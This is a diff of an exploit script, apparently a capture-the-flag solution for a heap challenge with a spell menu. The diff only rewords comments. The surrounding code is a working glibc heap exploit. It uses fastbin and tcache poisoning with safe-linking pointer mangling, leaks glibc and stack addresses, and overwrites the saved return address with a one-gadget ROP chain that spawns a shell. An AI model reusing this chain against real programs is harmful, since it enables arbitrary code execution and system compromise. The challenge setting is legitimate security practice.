@@ -39,7 +39,7 @@ def delete_spell(slot):
     p.sendlineafter(b"Choice: ", b'4')
     p.sendlineafter(b"Enter spell slot to delete (0-31): ", str(slot).encode())
 
-# malloc a chunk with a given size, read corresponding bytes of data at most into it, and write malloced chunk's data as a string (this can be used twice at most)
+# malloc a chunk with a given size, read corresponding bytes of data at most into it, and write malloced chunk's data as a string by puts function (this can be used twice at most)
 def feedback(size, feedback):
     p.sendlineafter(b"Choice: ", b'5')
     p.sendlineafter(b"Enter size of feedback: ", str(size).encode())
@@ -70,7 +70,7 @@ for i in range(3, 9):
 delete_spell(1) # heap_base_addr+0x320
 # overwrite fd pointer of chunk at heap_base_addr+0x320 to make fastbin of size 0x80 look like heap_base_addr+0x320->heap_base_addr+0x390
 edit_spell(1, p64(((heap_base_addr+0x390-0x10)^(heap_base_addr+0x320)>>12)), b'\x00', 0, 0, 0) # heap_base_addr+0x320
-# allocate a chunk at heap_base_addr+0x320 to put a 0x8-aligned byte of 0x81 value on heap_base_addr+0x390-0x8 as a valid size field, now fastbin of size 0x80 looks like heap_base_addr+0x390
+# calloc a chunk at heap_base_addr+0x320 to put a 0x8-aligned byte of 0x81 value on heap_base_addr+0x390-0x8 as a valid size field, now fastbin of size 0x80 looks like heap_base_addr+0x390
 add_spell(1, b'A', b'\x00', 0, 0, 0x81) # heap_base_addr+0x320
 # perform fastbin poisoning into heap at heap_base_addr+0x390 to overwrite size field of chunk at heap_base_addr+0x3a0 to 0x481
 add_spell(15, p64(0)+p64(0x481), b'\x00', 0, 0, 0) # heap_base_addr+0x390
@@ -86,9 +86,9 @@ log.info(f"glibc base address: {hex(glibc_base_addr)}")
 # Stage 3: leak target stack address through tcache poisoning
 # overwrite fd pointer of chunk at heap_base_addr+0x6a0 to make tcache bin of size 0x80 look like heap_base_addr+0x6a0->glibc_base_addr+glibc_e.symbols['__libc_argv']-0x10
 edit_spell(8, p64(((glibc_base_addr+glibc_e.symbols['__libc_argv']-0x10)^(heap_base_addr+0x6a0)>>12)), b'\x00', 0, 0, 0) # heap_base_addr+0x6a0
-# perform tcache poisoning
+# malloc a chunk to perform tcache poisoning
 feedback(0x78, b'A') # heap_base_addr+0x6a0
-# write 0x10 bytes of data right before glibc_base_addr+glibc_e.symbols['__libc_argv'] for leak by puts function
+# malloc a chunk to write 0x10 bytes of data right before glibc_base_addr+glibc_e.symbols['__libc_argv'] for leak by puts function
 feedback(0x78, b'A'*0x10) # glibc_base_addr+glibc_e.symbols['__libc_argv']-0x10
 p.recvuntil(b"A"*0x10)
 target_stack_addr = u64(p.recv(6).ljust(8, b'\x00'))-0x130 # xf -p rw- 0x0000000000000081
@@ -103,7 +103,7 @@ delete_spell(13)
 delete_spell(14) # heap_base_addr+0x9a0
 # overwrite fd pointer of chunk at heap_base_addr+0x9a0 to make fastbin of size 0x80 look like heap_base_addr+0x9a0->target_stack_addr+0x8
 edit_spell(14, p64(((target_stack_addr+0x8-0x10)^(heap_base_addr+0x9a0)>>12)), b'\x00', 0, 0, 0) # heap_base_addr+0x9a0
-# allocate a chunk at heap_base_addr+0x9a0, now fastbin of size 0x80 looks like target_stack_addr+0x8
+# calloc a chunk at heap_base_addr+0x9a0, now fastbin of size 0x80 looks like target_stack_addr+0x8
 add_spell(14, b'A', b'\x00', 0, 0, 0) # heap_base_addr+0x9a0
 # 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
 # constraints:
@@ -115,7 +115,7 @@ chain = [
     0,
     glibc_base_addr+0xef52b
 ]
-# perform fastbin poisoning into stack at target_stack_addr+0x8 to overwrite saved rbp value with a valid rbp value for one gadget and return address with ROP chain
+# perform fastbin poisoning into stack at target_stack_addr+0x8 to overwrite saved rbp with a valid value for one gadget and return address with ROP chain
 add_spell(16, p64(target_stack_addr+0xa0)+b''.join([p64(c) for c in chain]), b'\x00', 0, 0, 0) # target_stack_addr+0x8
 # return from main function to trigger one gadget
 exit()
